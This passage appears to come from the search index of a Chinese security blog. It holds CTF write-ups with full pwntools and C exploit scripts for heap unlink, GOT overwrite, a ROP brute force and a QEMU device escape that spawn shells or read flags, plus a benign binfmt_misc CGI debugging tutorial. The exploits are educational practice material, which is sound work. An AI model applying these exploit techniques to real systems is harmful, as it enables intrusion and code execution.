3)      end = time.time()      sh.close()      #根据网络延迟，作相应的修改      if end - start &gt; 3:         if guess_char == &#x27;\\x00&#x27;:            OK = True         flag += guess_char         print &#x27;success guess char at(&#x27;,index,&#x27;)&#x27;         index+=1         break   print &#x27;flag=&#x27;,flag   if length == len(flag):      OK = True      print &#x27;ojbk!&#x27;","categories":["CTF"],"tags":["shellcode","盲注","IO FILE"]},{"title":"zctf2016-note2","url":"/2020/04/17/zctf2016-note2/","content":"首先，检查一下程序的保护机制\n\n然后用IDA分析一下，在edit函数里存在一个溢出漏洞，我们只需要让v6-strlen(&amp;dest) &#x3D;&#x3D; 0，即可绕过’\\0’的截断，实现溢出。因此我们只需add(0,’’)，即可利用这个chunk来溢出，由于PIE也没开启并且堆指针保存在bss段，因此做unsorted bin unlink比较简单。\n\n\n需要注意的是由于使用了strcpy函数，因此，我们布置64位数据时，必须从最后一个开始，前面用正常不截断的字符填充，逐步向前来布置多个64位数据。\n#coding:utf8from pwn import *#sh = process(&#x27;./note2&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25799)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)elf = ELF(&#x27;./note2&#x27;)atoi_got = elf.got[&#x27;atoi&#x27;]free_got = elf.got[&#x27;free&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]sh.sendlineafter(&#x27;Input your name:&#x27;,&#x27;haivk&#x27;)sh.sendlineafter(&#x27;Input your address:&#x27;,&#x27;huse&#x27;)def add(size,content):   sh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;(less than 128)&#x27;,str(size))   sh.sendlineafter(&#x27;Input the note content:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Input the id of the note:&#x27;,str(index))def edit(index,content,mode=1):   sh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Input the id of the note:&#x27;,str(index))   sh.sendlineafter(&#x27;[1.overwrite/2.append]&#x27;,str(mode))   sh.sendlineafter(&#x27;TheNewContents:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Input the id of the note:&#x27;,str(index))heap_ptr_1 = 0x0000000000602120#prev_size sizefake_chunk = p64(0) + p64(0x81 + 0x20)#fd、bkfake_chunk += p64(heap_ptr_1 - 0x18) + p64(heap_ptr_1 - 0x10)fake_chunk += &#x27;a&#x27;*0x10add(0x80,fake_chunk) #0add(0,&#x27;&#x27;) #1add(0x80,&#x27;b&#x27;*0x20) #2add(0x10,&#x27;c&#x27;*0x8) #3#通过1溢出，修改chunk2的头数据#修改chunk1的prev_size#由于strncat遇0截断，因此，写prev_size和size的时候，我们分两步，从后往前写#第一次写size为0x90，即设置prev_inuse为0标记前面的chunk为空闲状态payload = &#x27;d&#x27;*0x10 + &#x27;d&#x27;*0x8 + p8(0x90)edit(1,payload)#第二次写prev_size，需要先清零prev_size处其他的d数据for i in range(7,-1,-1):   payload = &#x27;d&#x27;*0x10 + &#x27;d&#x27;*i   edit(1,payload)#现在写prev_size，写为0x20 + 0x80payload = &#x27;d&#x27;*0x10 + p64(0x20 + 0x80)edit(1,payload)#unsorted bin unlinkdelete(2)#现在可以控制堆指针数组了#第一次，我们先将heap[0]改成heap数组本身的地址+8，进而下一次利用edit(0,&#x27;a&#x27;*0x18 + p64(heap_ptr_1 + 8))#修改heap[1]为atoi_gotpayload = p64(atoi_got)edit(0,payload)#泄露atoi地址show(1)sh.recvuntil(&#x27;Content is &#x27;)atoi_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base = atoi_addr - libc.sym[&#x27;atoi&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#修改atoi的got表为system地址edit(1,p64(system_addr))#getshellsh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;/bin/sh&#x27;)sh.interactive()\n","categories":["CTF"],"tags":["unlink","unsorted bin"]},{"title":"zctf2016-note3","url":"/2020/04/17/zctf2016-note3/","content":"首先检查一下程序的保护机制\n\n然后用IDA分析一下,edit里存在一个整数溢出导致堆溢出的漏洞。当输入为0x8000000000000000时，即可使得index为-1，由于输入的长度不够，因此将0x8000000000000000转为负数的形式输入进去即可。然后就是正常的unlink了。\n\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./zctf_2016_note3&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29603)elf = ELF(&#x27;./zctf_2016_note3&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)atoi_got = elf.got[&#x27;atoi&#x27;]free_got = elf.got[&#x27;free&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]heap_0_ptr_addr = 0x00000000006020C8def add(size,content):   sh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;(less than 1024)&#x27;,str(size))   sh.sendafter(&#x27;content:&#x27;,content[0:size-1])def edit(index,content):   sh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Input the id of the note:&#x27;,str(index))   sh.sendafter(&#x27;Input the new content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Input the id of the note:&#x27;,str(index))#0add(0x100,&#x27;a&#x27;*0x100)#1add(0x100,&#x27;b&#x27;*0x100)#2add(0x10,&#x27;c&#x27;*0x10)#3add(0x10,&#x27;c&#x27;*0x10)#4add(0x10,&#x27;c&#x27;*0x10)#5add(0x10,&#x27;c&#x27;*0x10)#6add(0x10,&#x27;c&#x27;*0x10)#让heaps[-1]为heaps[0]delete(0)add(0x100,&#x27;a&#x27;*0x100)#现在，通过让index为-1，就可以溢出chunk0payload = p64(0) + p64(0x101)payload += p64(heap_0_ptr_addr - 0x18) + p64(heap_0_ptr_addr - 0x10)payload = payload.ljust(0x100,&#x27;a&#x27;)payload += p64(0x100) + p64(0x110)payload += &#x27;\\n&#x27;edit(0x8000000000000000 - 0x10000000000000000,payload)#unlinkdelete(1)payload = p64(0) * 3 + p64(free_got) + p64(atoi_got) *2payload = payload.ljust(80,&#x27;\\x00&#x27;)payload += p64(0x8)*3edit(0,p64(0) * 3 + p64(free_got) + p64(atoi_got) *2 + &#x27;\\n&#x27;)#修改free的got表为puts的plt表edit(0,p64(puts_plt)[0:7] + &#x27;\\n&#x27;)#泄露atoi地址delete(1)sh.recvuntil(&#x27;\\n&#x27;)atoi_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base = atoi_addr - libc.sym[&#x27;atoi&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#修改atoi的got表为system地址edit(2,p64(system_addr)[0:7] + &#x27;\\n&#x27;)#getshellsh.sendlineafter(&#x27;option---&gt;&gt;&#x27;,&#x27;/bin/sh\\x00&#x27;)sh.interactive()\n","categories":["CTF"],"tags":["unlink","unsorted bin","整数溢出"]},{"title":"zer0pts_2020_babybof（一种在FULL RELRO情况下无泄漏的getshell方法）","url":"/2020/07/26/zer0pts_2020_babybof/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们在IDA里分析一下,是一个极其简单的程序，存在栈溢出\n\n\n但是程序里没有函数用于泄露，并且FULL RELRO，不能使用ret2dl。\n但是可以覆盖bss上stderr的指针为one_gadget，然后call，但是这个概率极其低\n\n\n介绍一种FULL RELRO清空下无泄漏，且概率在1&#x2F;16左右的getshell新方法。\n\n\n我们看到，在栈底部某处，有一个ld的地址，我们可以低字节覆盖其后两字节，则有1&#x2F;16的几率正好到ld里某处syscall的位置。因此，我们在前面通过rop，设置好寄存器的值后，剩下部分使用ret填充一直到此处，然后再覆盖低2个字节，这样，程序通过前面的ret，一直滑行，最终到达此处，调用syscall从而getshell。\n在这里，通过调用setbuf函数，可以使得rdx寄存器指向一片空数据的区域，这样可以满足execve系统调用的第三个参数的要求，然后第1、第2个参数我们可以用gadget控制。\n然后，还有一个地方需要爆破，该ld的地址与栈溢出的起始点之间的偏移，在不同机器上可能不同，也就是远程和本地，其距离可能不同。因此，我们还需要爆破它们之间的距离。\n#coding:utf8from pwn import *context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./zer0pts_2020_babybof&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so:./ld-2.23.so&#x27;&#125;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,26697)elf = ELF(&#x27;./zer0pts_2020_babybof&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]pop_rdi = 0x000000000040049cpop_rsi = 0x000000000040049epop_rbp = 0x000000000040047cleave_ret = 0x0000000000400499fun_addr = 0x000000000040047Ebss = 0x0000000000601100steup = 0x000000000040043Fret = 0x000000000040047Dfor i in range(12,20): #爆破距离   for j in range(100):      try:         payload = &#x27;a&#x27;*0x28 + p64(steup) #执行setup函数后，rdx指向一片空数据区域         payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss) + p64(read_plt)         payload += p64(pop_rdi) + p64(bss)         payload += p64(pop_rsi) + p64(0)         #payload += p64(ret)*11 #local         payload += p64(ret)*i #remote = 18         payload += p16(0x4BD3)         global sh         #sh = process(&#x27;./zer0pts_2020_babybof&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so:./ld-2.23.so&#x27;&#125;)         sh = remote(&#x27;node3.buuoj.cn&#x27;,26780)         #sh = remote(&#x27;192.168.232.129&#x27;,8666)         #raw_input()         sh.send(payload)         sleep(1)         #raw_input()         sh.send(&#x27;/bin/sh&#x27;.ljust(0x3B,&#x27;\\x00&#x27;))         sleep(1)         sh.sendline(&#x27;cat /flag&#x27;)         if &#x27;timeout&#x27; in sh.recv():            raise Exception(&#x27;retry&#x27;)         sh.interactive()      except:         sh.close()         print &#x27;trying...&#x27;","categories":["CTF"],"tags":["栈溢出","ROP","ret2syscall","爆破"]},{"title":"中关村2019_two_string","url":"/2020/07/24/%E4%B8%AD%E5%85%B3%E6%9D%912019_two_string/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，合并的时候，使用的是strcat，但是total_size的计算，没有考虑如果原size为0的情况。\n\n\n在add里面，我们可以申请size为0的堆。\n\n\n根据堆的性质，malloc(0)和malloc(0x10)申请的是同一个大小的chunk，假设在fastbin里有多个chunk，malloc(0)取得的chunk其fd有一个指针，没有被清空，这样strcat就可以把这个指针追加进去，从而后面的堆的内容strcat后，就溢出了。那么就可以构造overlap chunk，然后进行常规的堆利用了。\n#coding:utf8from pwn import *#sh = process(&#x27;./two_string&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)#sh = process(&#x27;./two_string&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29489)libc = ELF(&#x27;./libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]def add(size,content):   sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;string :&#x27;,str(size))   sh.sendafter(&#x27;string :&#x27;,content)def show(index):   sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index :&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index :&#x27;,str(index))def merge_strs(seq):   sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;,&#x27;5&#x27;)   sh.sendlineafter(&#x27;merged :&#x27;,seq)add(0x10,&#x27;a&#x27;*0x10) #0add(0xF0,&#x27;b&#x27;*0xF0) #1add(0x20,&#x27;c&#x27;*0x20) #2delete(0)add(0x400,&#x27;b\\n&#x27;) #0add(0xF0,&#x27;c&#x27;*0xF0) #3add(0x3F8,&#x27;d&#x27;*0x3E2 + p64(0x410 + 0x70 + 0xC0) + p64(0x100) + &#x27;\\n&#x27;) #4for i in range(5,12):   add(0xF0,&#x27;e\\n&#x27;)for i in range(5,12):   delete(i)#chunk1放入unsorted bindelete(1)add(0,&#x27;&#x27;) #1show(1)sh.recvuntil(&#x27;Notes are : &#x27;)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)for i in range(5,8):   add(0x10,&#x27;\\n&#x27;)add(0,&#x27;&#x27;) #8show(8)sh.recvuntil(&#x27;Notes are : &#x27;)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)delete(0)merge_strs(&#x27;1 1 1 1 1 1 4&#x27;) #0使得chunk3的size低1字节为0#清空prev_sizefor i in range(7,-1,-1):   delete(4)   add(0x3F8,&#x27;d&#x27;*0x3E2 + &#x27;d&#x27;*i + &#x27;\\n&#x27;) #4   delete(0)   merge_strs(&#x27;1 1 1 1 1 4&#x27;) #0#布置prev_sizedelete(4)add(0x3F8,&#x27;d&#x27;*0x3E2 + p64(0x540) + &#x27;\\n&#x27;) #4delete(0)merge_strs(&#x27;1 1 1 1 1 4&#x27;) #0delete(3) #形成overlap chunkadd(0xD0,&#x27;/bin/sh\\n&#x27;) #3add(0x60,&#x27;b&#x27;*0x20 + &#x27;\\n&#x27;) #9#double freedelete(2)delete(9)add(0x60,p64(free_hook_addr) + &#x27;\\n&#x27;) #2add(0x60,&#x27;a\\n&#x27;)add(0x60,p64(system_addr) + &#x27;\\n&#x27;)#getshelldelete(3)sh.interactive()","categories":["CTF"],"tags":["堆溢出","overlap chunk"]},{"title":"利用binfmt_misc机制加快CGI的调试","url":"/2025/06/19/%E5%88%A9%E7%94%A8binfmt-misc%E6%9C%BA%E5%88%B6%E5%8A%A0%E5%BF%ABCGI%E7%9A%84%E8%B0%83%E8%AF%95/","content":"一、binfmt_misc介绍binfmt_misc是Linux内核的一项功能，其使得内核可识别任意类型的可执行文件格式并传递至特定的用户空间应用程序，如模拟器和虚拟机。例如在装有qemu的x86-64的Linux中可以直接执行ARM64程序不需要指明使用qemu。\n\n\n二、binfmt_misc机制分析要使用binfmt_misc机制，首先需要挂载binfmt_misc\nmount binfmt_misc -t binfmt_misc /proc/sys/fs/binfmt_misc\n在&#x2F;proc&#x2F;sys&#x2F;fs&#x2F;binfmt_misc文件夹下会有一些已经注册的配置文件，分别用来处理各种个样的二进制程序\n\n配置文件中的内容一般有interpreter 文件交给哪个处理程序、magic 匹配文件头、mask 匹配文件头时使用的掩码\n\ntype应为E或M类型\n\n若类型为E，则可执行文件格式由其文件扩展名进行识别：magic是与二进制格式相关联的文件扩展名；此时忽略offset和mask参数。\n若类型为M，则可执行文件格式通过文件中的offset的（默认为0）magic数字识别；mask是全默认为 0xFF的bitmask，其用于指示数字中存在意义的二进制位。\n\nflags： 这些标志控制解析器的行为和操作方式。下面是一些常见的 flags 标志及其作用： \n\nO：覆盖(Override)标志。当多个解析器的匹配规则冲突时，使用具有此标志的解析器进行匹配和执行。\nE：可执行文件标志。指定解析器用于执行可执行文件的功能。 \nF：开启自动刷新标志。当启用此标志时，每次访问 register 文件时都会重新加载解析器配置。 \nC：关闭自动刷新标志。当关闭此标志时，解析器配置只在系统启动时加载一次，之后不会自动刷新。\nB：启用解析器的特权执行。这将允许使用具有特权的解析器执行文件。\nM：启用魔数验证标志。指定解析器在匹配时必须验证魔数。\n\n注意事项：offset+size(magic) 必须小于 128，解释器字符串不得超过 127 个字符\n三、注册一个新的配置文件使用echo &quot;:name:type:offset:magic:mask:interpreter:flags&quot; &gt; /proc/sys/fs/binfmt_misc/register的格式来注册配置文件，例如我们可以注册一个这样的配置文件\necho &quot;:hello:M:10:123456:\\xff\\xff\\xff\\xff\\xff\\xff:/bin/cat:O&quot; &gt; /proc/sys/fs/binfmt_misc/register\n并使用这样的文件内容来触发\naaaaaaaaaa123456bbbbbb\n\n要取消注册一个配置文件，可以执行echo -1 &gt; /proc/sys/fs/binfmt_misc/xxx\n\n\n我们还可以使用扩展名匹配的方式echo &quot;:hello:E::log::/bin/cat:O&quot; &gt; /proc/sys/fs/binfmt_misc/register\n\n\n四、binfmt_misc的利用CGI程序调试在调试CGI程序时，一般需要先用gdb附加到类似于httpd的主进程上，然后慢慢的跟踪子进程的创建，最后一步一步的才能调试到CGI程序；又或者是对CGI程序打补丁，加入sleep函数给gdb附加创造一个时机。有了binfmt_misc机制，CGI调试可以变得非常简单，对于带有.cgi后缀的，我们可以直接使用扩展名匹配的方式，将.cgi程序交给gdb来启动为了过滤出想要调试的具体cgi程序，我们需要写一个中间代理程序。\necho &quot;:cgi_test:E::cgi::/mnt/hgfs/works/share/debug:O&quot; &gt; /proc/sys/fs/binfmt_misc/register\n\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[]) &#123;    char buf[100];    char tmp_exec[200];    char *gdb_path = &quot;/usr/bin/gdb&quot;;    char *target_config = &quot;test2.cgi&quot;;    // 构建新的参数数组，保留所有原始参数    char **new_argv = calloc(argc + 10,sizeof(char *));    if (!new_argv) &#123;        perror(&quot;calloc failed&quot;);        exit(EXIT_FAILURE);    &#125;    char *name = strrchr(argv[1],&#x27;/&#x27;);    if (name) &#123;        name = name + 1;    &#125; else &#123;        name = argv[1];    &#125;    snprintf(tmp_exec,200,&quot;/tmp/%s.tmp&quot;,name);    snprintf(buf,100,&quot;cp %s %s&quot;,argv[1],tmp_exec);    system(buf);    // 检查第一个参数是否匹配目标配置    if (argc &gt; 1 &amp;&amp; strstr(argv[1], target_config)) &#123;        new_argv[0] = &quot;/usr/bin/gdb&quot;;        new_argv[1] = &quot;-x&quot;;        new_argv[2] = &quot;/mnt/hgfs/works/share/script.gdb&quot;;        new_argv[3] = &quot;--args&quot;;        new_argv[4] = tmp_exec;        // 复制剩余参数        for (int i = 2; i &lt; argc; i++) &#123;            new_argv[i + 3] = argv[i];        &#125;        // 执行gdb        execv(gdb_path, new_argv);    &#125; else &#123;        new_argv[0] = tmp_exec;        // 直接复制所有参数        for (int i = 2; i &lt; argc; i++) &#123;            new_argv[i-1] = argv[i];        &#125;        // 执行        execv(tmp_exec, new_argv);    &#125;    // 如果execv返回，说明出错了    perror(&quot;execv failed&quot;);    free(new_argv);    return EXIT_FAILURE;&#125;\n中间代理程序会检查要执行的程序，如果是test2.cgi，那么就会使用/usr/bin/gdb -x /mnt/hgfs/works/share/script.gdb --args /tmp/test2.cgi.tmp xxxx，这里我们需要拷贝一份CGI程序，同时后缀要加上.tmp防止gdb启动CGI时再次匹配上.cgi后缀进入一个死循环。\n\n\n在实际调试时，我们应该使用gdbserver而不是gdb来启动CGI，因为CGI的标准输入输出不在终端，因此稍微修改一下\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[]) &#123;    char buf[100];    char tmp_exec[200];    char *gdb_path = &quot;/usr/bin/gdbserver&quot;;    char *target_config = &quot;test2.cgi&quot;;    // 构建新的参数数组，保留所有原始参数    char **new_argv = calloc(argc + 10,sizeof(char *));    if (!new_argv) &#123;        perror(&quot;calloc failed&quot;);        exit(EXIT_FAILURE);    &#125;    char *name = strrchr(argv[1],&#x27;/&#x27;);    if (name) &#123;        name = name + 1;    &#125; else &#123;        name = argv[1];    &#125;    snprintf(tmp_exec,200,&quot;/tmp/%s.tmp&quot;,name);    snprintf(buf,100,&quot;cp %s %s&quot;,argv[1],tmp_exec);    system(buf);    // 检查第一个参数是否匹配目标配置    if (argc &gt; 1 &amp;&amp; strstr(argv[1], target_config)) &#123;        new_argv[0] = &quot;/usr/bin/gdbserver&quot;;        new_argv[1] = &quot;0.0.0.0:1234&quot;;        new_argv[2] = tmp_exec;        // 复制剩余参数        for (int i = 2; i &lt; argc; i++) &#123;            new_argv[i + 1] = argv[i];        &#125;        // 执行gdbserver        execv(gdb_path, new_argv);    &#125; else &#123;        new_argv[0] = tmp_exec;        // 直接复制所有参数        for (int i = 2; i &lt; argc; i++) &#123;            new_argv[i-1] = argv[i];        &#125;        // 执行        execv(tmp_exec, new_argv);    &#125;    // 如果execv返回，说明出错了    perror(&quot;execv failed&quot;);    free(new_argv);    return EXIT_FAILURE;&#125;\n\n\nCGI被httpd等程序启动时，会自动进入gdbserver监听1234端口等待调试。\nqemu-user模拟下的CGI调试以模拟调试Cisco RV340的CGI为例，使用chroot + qemu-arm-static基本可以将根文件系统模拟起来，虽然有报错但是http服务可以正常启动。\n对qemu-arm的binfmt_misc配置文件首先进行取消注册echo -1 &gt; /proc/sys/fs/binfmt_misc/qemu-arm，然后注册新的配置，将ARM程序交给中间代理程序debug进行处理\necho &#x27;:qemu-arm:M:0:\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00:\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xff\\xff\\xff:/debug:OC&#x27; &gt; /proc/sys/fs/binfmt_misc/register\n\n中间代理程序debug如下\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[]) &#123;    char *qemu_path = &quot;/qemu-arm-static&quot;;    char *target_config = &quot;/www/cgi-bin/upload.cgi&quot;;        // 构建新的参数数组，保留所有原始参数    char **new_argv = malloc((argc + 1) * sizeof(char *));    if (!new_argv) &#123;        perror(&quot;malloc failed&quot;);        exit(EXIT_FAILURE);    &#125;        // 第一个参数是qemu路径    new_argv[0] = qemu_path;        // 检查第一个参数是否匹配目标配置    if (argc &gt; 1 &amp;&amp; strcmp(argv[1], target_config) == 0) &#123;        // 添加-g 1234参数        new_argv[1] = &quot;-g&quot;;        new_argv[2] = &quot;1234&quot;;                // 复制剩余参数        for (int i = 1; i &lt; argc; i++) &#123;            new_argv[i + 2] = argv[i];        &#125;        new_argv[argc + 2] = NULL;                // 执行qemu        execv(qemu_path, new_argv);    &#125; else &#123;        // 直接复制所有参数        for (int i = 1; i &lt; argc; i++) &#123;            new_argv[i] = argv[i];        &#125;        new_argv[argc] = NULL;                // 执行qemu        execv(qemu_path, new_argv);    &#125;        // 如果execv返回，说明出错了    perror(&quot;execv failed&quot;);    free(new_argv);    return EXIT_FAILURE;&#125;\n代理程序过滤了/www/cgi-bin/upload.cgi，如果匹配到这个CGI，就会执行/qemu-arm-static -g 1234 /www/cgi-bin/upload.cgi进入调试模式。\n\n\n此时可以直接使用gdb-multiarch进行远程附加，可以看到环境变量传递这些一个不漏，比手动执行CGI然后构造REQUEST_METHOD=POST QUERY_STRING的方式要更加的方便快捷，是服务器真实传递给CGI的参数。\n\n\n五、小结binfmt-misc机制可以匹配任意格式的文件并将文件传递给注册的处理程序进行处理。我们可以借助binfmt-misc机制来对一些特定的程序进行处理，比如加入调试、监听程序的打开等操作。\n六、参考binfmt_misc wikibinfmt_misc CSDN\n","categories":["安全研究"],"tags":["QEMU","CGI","binfmt_misc"]},{"title":"华为CTF2020第一场_fastexec","url":"/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-fastexec/","content":"在设备的write函数里，存在任意地址读写，但是仅能写一次，也不能泄露\n\n可以考虑低字节写opaque，使得opaque设备对象向上移动，在内存里找到合适位置，使得opaque-&gt;execed为0，而其他字段有内容，这样，这可以利用设备的read函数，读取字段便可以泄露地址，而且由于opaque-&gt;execed为0，我们还可以再次进行任意地址写。\n\n\n\n\n最后，我们可以劫持设备MemoryRegion里的ops和opaque，其中ops为虚表，我们劫持到可控区，opaque为rdi，可以作为参数，最后调用设备read即可触发。由于本题是低字节覆盖，因此需要爆破4bit，多次几次就可以成功。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#define PFN_MASK ((((size_t)1)&lt;&lt;54)-1)char *mmio;/*我们程序的缓冲在虚拟机里对应的物理地址*/size_t buffer_phys_addr;char *buffer;void die(char *msg) &#123;   perror(msg);   exit(-1);&#125;//写设备内存void mmio_write(uint64_t addr,uint64_t val) &#123;   *((uint64_t *)(mmio + addr)) = val;&#125;//读设备内存uint64_t mmio_read(uint64_t addr) &#123;   return *((uint64_t *)(mmio + addr));&#125;void setPhyAddr(uint64_t val) &#123;   mmio_write(24,val);&#125;void setPos(uint64_t val) &#123;   mmio_write(8,val);&#125;void setLength(uint64_t val) &#123;   mmio_write(16,val);&#125;void mem_read_write(uint64_t phyAddr,uint64_t pos,uint64_t length) &#123;   setPhyAddr(phyAddr);   setPos(pos);   setLength(length);   mmio_write(32,63021);&#125;size_t get_phys_addr(char *vir_addr) &#123;   int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY); /*打开页映射表*/   if (fd == -1) &#123;      die(&quot;open pagemap error&quot;);   &#125;   size_t vir = (size_t)vir_addr;   // /0x1000获得是第n页的这个n，由于一个记录数据8字节，因此*8，算的的就是该页在文件里的记录的偏移   size_t offset = vir / 0x1000 * 8;   if (lseek(fd,offset,SEEK_SET) == -1) &#123;      die(&quot;lseek pagemap error&quot;);   &#125;   size_t addr;   if (read(fd,&amp;addr,8) != 8) &#123;      die(&quot;read pagemap error&quot;);   &#125;   addr = (addr &amp; PFN_MASK) * 0x1000;   return addr;&#125;int main(int argc,char ** argv) &#123;   //打开设备   int fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;,O_RDWR);   if (fd == -1) &#123;      die(&quot;open device error&quot;);   &#125;   //映射设备内存   mmio = mmap(NULL,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,fd,0);   if (mmio == MAP_FAILED) &#123;      die(&quot;mmap device memory error&quot;);   &#125;   /*映射一块缓冲区*/   buffer = mmap(NULL,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS,-1,0);   if (buffer == MAP_FAILED) &#123;      die(&quot;mmap local buffer error&quot;);   &#125;   //必须锁住内存，才能准确获得物理地址   mlock(buffer, 0x1000);   //获得buffer的物理映射地址   buffer_phys_addr = get_phys_addr(buffer);   printf(&quot;buffer_phys_addr=0x%lx\\n&quot;,buffer_phys_addr);   size_t *d = (size_t *)buffer;   //将FastexecState *上移   size_t low = 0xf010 - 0x88;   buffer[0] = low &amp; 0xff;   low = low &gt;&gt; 0x8;   buffer[1] = low &amp; 0xff;   mem_read_write(buffer_phys_addr,-0xC0,0x2);   size_t elf_base = mmio_read(16) - 0x31bd40;   size_t system_addr = elf_base + 0x2C2180;   printf(&quot;elf_base=0x%lx\\n&quot;,elf_base);   printf(&quot;system_addr=0x%lx\\n&quot;,system_addr);   low = 0xf010 - 0x48;   buffer[0] = low &amp; 0xff;   low = low &gt;&gt; 0x8;   buffer[1] = low &amp; 0xff;   mem_read_write(buffer_phys_addr,-0x38,0x2);   //getchar();   size_t obj_addr = mmio_read(0x8) - 0x998;   printf(&quot;obj_addr=0x%lx\\n&quot;,obj_addr);   d[0] = obj_addr + 0x948;   d[1] = obj_addr + 0x950;   d[2] = system_addr;   char cmd[0x100] = &quot;cat &quot;;   char *f = argv[1];   int len = strlen(f);   strcat(cmd,f);   cmd[strlen(cmd)] = 0;   //劫持设备对象   memcpy(buffer+0x18,cmd,strlen(cmd)+1);   mem_read_write(buffer_phys_addr,-0x80,0x18 + strlen(cmd)+1);   //getchar();   //getshell   mmio_read(0x666);   return 0;&#125;","categories":["CTF"],"tags":["变量覆盖","QEMU"]},{"title":"华为CTF2020第一场_qemuzzz_1","url":"/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/","content":"存在一个off by one，可以多读取或写入一个字节\n\n其中buf后面是设备obj指针，由于读写会用到这个指针，因此，我们可以修改obj指针的低1字节，使得phys_addr、length、pos、obj、以及cpu_physical_memory_rw函数指针等字段偏移到buf可控区里。\n\n\n同时cpu_physical_memory_rw是以原来对象指针来取得，而不是从obj，因此可以通过修改后的obj的buf来写cpu_physical_memory_rw指针。\n\n由于offset等字段的设置不是为obj指针设置，而是原来位置设置\n\n因此可以使用异或操作来将length1的低1位取反，进而可以在读操作完成后进行最后一步写操作。\n\nexp\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#define PFN_MASK ((((size_t)1)&lt;&lt;54)-1)char 